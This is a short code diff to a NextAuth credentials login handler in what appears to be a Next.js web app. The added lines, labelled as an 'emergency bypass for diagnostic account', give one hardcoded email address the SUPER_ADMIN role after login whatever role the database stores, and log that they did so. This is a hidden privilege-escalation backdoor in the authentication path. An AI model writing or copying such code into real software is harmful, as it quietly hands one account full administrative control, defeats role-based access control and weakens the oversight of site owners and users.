@@ -31,6 +31,13 @@ export const authOptions: NextAuthOptions = {
             console.error(`Auth: Password mismatch for user - ${credentials.email}`);
             throw new Error("كلمة المرور غير صحيحة");
           }
+
+          // EMERGENCY BYPASS FOR DIAGNOSTIC ACCOUNT
+          if (user.email === 'mazaacdemy@gmail.com') {
+            console.log("Auth: Force SUPER_ADMIN for diagnostic account");
+            return { id: user.id, name: user.name, email: user.email, role: "SUPER_ADMIN" };
+          }
+
           console.log(`Auth: Success for user - ${credentials.email} (Role: ${user.role})`);
           return { id: user.id, name: user.name, email: user.email, role: user.role };
         } catch (error: any) {
